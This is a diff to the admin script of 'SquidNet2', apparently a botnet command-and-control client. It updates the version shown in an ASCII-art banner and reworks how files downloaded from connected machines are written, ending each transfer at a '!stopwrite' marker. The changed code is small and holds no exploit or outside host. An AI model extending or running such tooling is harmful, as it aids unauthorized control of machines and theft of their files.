@@ -26,12 +26,12 @@ class Admin:
                                || || ||
                                || || ||
                                || || ||
-  _________            .__    .||_||_||__          __  ________      _____       .___      .__               ________      ____ 
- /   _____/ ________ __|__| __| _/\      \   _____/  |_\_____  \    /  _  \    __| _/_____ |__| ____   ___  _\_____  \    /_   |
- \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/   /  /_\  \  / __ |/     \|  |/    \  \  \/ / _(__  <     |   |
- /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \  /    |    \/ /_/ |  Y Y  \  |   |  \  \   / /       \    |   |
-/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \ \____|__  /\____ |__|_|  /__|___|  /   \_/ /______  / /\ |___|
-        \/    |__|             || || ||  \/     \/             \/         \/      \/     \/        \/               \/  \/      
+  _________            .__    .||_||_||__          __  ________      _____       .___      .__               ________      ________  
+ /   _____/ ________ __|__| __| _/\      \   _____/  |_\_____  \    /  _  \    __| _/_____ |__| ____   ___  _\_____  \     \_____  \ 
+ \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/   /  /_\  \  / __ |/     \|  |/    \  \  \/ / _(__  <      /  ____/ 
+ /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \  /    |    \/ /_/ |  Y Y  \  |   |  \  \   / /       \    /       \ 
+/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \ \____|__  /\____ |__|_|  /__|___|  /   \_/ /______  / /\ \_______ \\
+        \/    |__|             || || ||  \/     \/             \/         \/      \/     \/        \/               \/  \/         \/
                                || || ||
                                || || ||
                                || || ||
@@ -44,7 +44,7 @@ class Admin:
                              ____-\/-____
                                  -__-
                                 /    \\
-Admin Script For SquidNet2 by DrSquid
+[+] Admin Script For SquidNet2 by DrSquid
         """
         return logo
     def __init__(self):
@@ -169,18 +169,14 @@ Admin Script For SquidNet2 by DrSquid
                 else:
                     try:
                         if not self.first_msg_sent:
-                            if dec_msg.startswith("!filesize"):
-                                self.filesize = int(msg.split()[1])
-                                self.bytesrecv = 0
-                                self.first_msg_sent = True
-                            else:
-                                print(dec_msg)
+                            print(dec_msg)
+                            self.first_msg_sent = True
                         else:
-                            self.bytesrecv += len(msg)
-                            self.download_file.write(msg)
-                            if self.bytesrecv >= self.filesize:
+                            if dec_msg == "!stopwrite":
                                 self.download_file.close()
                                 self.downloading_file = False
+                            else:
+                                self.download_file.write(msg)
                     except Exception as e:
                         print(e)
             except Exception as e:
